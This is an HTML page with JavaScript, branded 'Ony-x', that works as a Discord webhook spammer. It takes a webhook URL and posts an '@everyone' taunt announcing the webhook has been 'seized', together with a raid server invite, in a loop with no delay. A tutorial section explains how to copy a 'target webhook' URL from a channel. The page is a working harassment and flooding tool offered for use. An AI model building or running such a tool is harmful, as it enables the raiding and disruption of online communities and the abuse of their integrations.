<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webhook spammer | Ony-x</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1e1e;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .container {
            display: flex;
            justify-content: space-around;
            align-items: center;
            height: 100vh;
        }
        .tab {
            padding: 15px 30px;
            background: #333;
            border-radius: 10px;
            cursor: pointer;
            transition: 0.3s;
            font-size: 18px;
        }
        .tab:hover {
            background: #555;
        }
        .tutorial-page {
            padding: 20px;
            background: #444;
            border-radius: 15px;
            width: 80%;
            margin: 20px auto;
            text-align: left;
        }
        .back-button {
            cursor: pointer;
            color: white;
            font-size: 18px;
            background: #333;
            border-radius: 5px;
            padding: 10px;
            margin-bottom: 20px;
            text-decoration: none;
        }
        .tutorial-content {
            font-size: 16px;
            text-align: left;
        }
        .tutorial-images {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        .tutorial-images img {
            width: 100%;
            height: auto;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="tab" onclick="openWebhookSpammer()">Webhook Spammer</div>
        <div class="tab" onclick="showTutorial()">TUTORIAL</div>
    </div>

    <div id="webhookSpammer" class="tutorial-page" style="display:none;">
        <a class="back-button" href="javascript:goBack()">‚Üê Back</a>
        <h3>Webhook Spammer</h3>
        <input type="text" id="webhookUrl" placeholder="Enter your webhook URL" style="padding: 10px; width: 80%; margin-bottom: 10px;">
        <button onclick="startSpamming()" style="padding: 10px 20px; background: #444; border-radius: 5px;">Start Spamming</button>
    </div>

    <script>
        let spamInterval; 

        function openWebhookSpammer() {
            document.querySelector('.container').style.display = 'none'; 
            document.getElementById('webhookSpammer').style.display = 'block'; 
        }

        function goBack() {
            clearInterval(spamInterval); 
            document.querySelector('.container').style.display = 'flex';
            document.getElementById('webhookSpammer').style.display = 'none'; 
        }

        function startSpamming() {
            const webhookUrl = document.getElementById('webhookUrl').value;
            if (!webhookUrl) {
                alert("Please enter a valid webhook URL!");
                return;
            }

            const payload = {
                content: "@everyone @everyone | Ony-x has seized your webhook | https://www.youtube.com/watch?v=Mic-fbDjiV8 | ü§°'d on by https://discord.gg/raid"
            };

            const spamButton = document.querySelector("button");
            spamButton.disabled = true; 

            spamInterval = setInterval(() => {
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => response.json())
                .catch(error => console.error('Error:', error));

                console.log("Message sent to webhook!");
            }, 0); 
        }

        function showTutorial() {
            document.body.innerHTML = ` 
                <div class="tutorial-page">
                    <a class="back-button" href="javascript:goBack()">‚Üê Back</a>
                    <h3>How to get a webhook URL</h3>
                    <div class="tutorial-content">
                        To get a webhook URL, go to a channel and hover over it (requires the "Make Webhook" permission or admin access). Click the cogwheel, then go to the "Integrations" tab. Click "Webhooks," select your target webhook, and click "Copy Webhook URL."
                    </div>
                </div>
            `;
        }
    </script>
</body>
</html>
